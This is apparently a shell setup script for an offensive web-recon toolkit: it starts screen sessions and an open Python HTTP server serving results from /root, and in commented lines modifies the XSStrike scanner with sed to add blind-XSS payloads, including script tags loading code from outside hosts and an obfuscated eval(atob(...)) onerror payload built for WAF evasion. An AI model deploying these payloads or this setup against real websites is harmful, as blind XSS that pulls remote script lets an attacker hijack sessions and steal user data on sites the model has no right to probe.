yes|apt install screen
screen -dmS $"bash"
cmd=$"source /root/sh/click_one.sh"
screen -x -S bash -X stuff "$cmd"
screen -x -S bash -X stuff $'\n'

screen -dmS $"http"
cmd=$"python -m SimpleHTTPServer 62345"
screen -x -S http -X stuff "$cmd"
screen -x -S http -X stuff $'\n'

mkdir /root/script
clear
echo "output.zip------cd /root/zip" ; echo "output.txt------cd /root/z_juice" ; echo "output.web------http://ip:62345/z_juice"
echo ""
echo ""
head -17 /root/sh/du_hast.sh | tail -1
#   time=`date "+%Y-%m-%d_%H:%M:%S"` ; echo "curl -X POST -H \"Content-type:application/json\" --data '{\"text\":\"${time}\"}' https://hooks.slack.com/services/token/token/token" > /root/script/slack.sh ; bash /root/script/slack.sh ; rm /root/script/slack.sh
echo ""
echo "replace URL to your slack webhook , then copy into /root/script/webhook.sh"
echo ""
echo ""
#   cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt ; sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=x id=xss7Yxssmh0dxssmloYW8ueHNzxssC5ib2R5LxssaWxkxssw&#61;&#61; onerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
head -23 /root/sh/du_hast.sh | tail -1
echo ""
echo "replace URL to your blind payload , then copy into /root/script/xss.sh
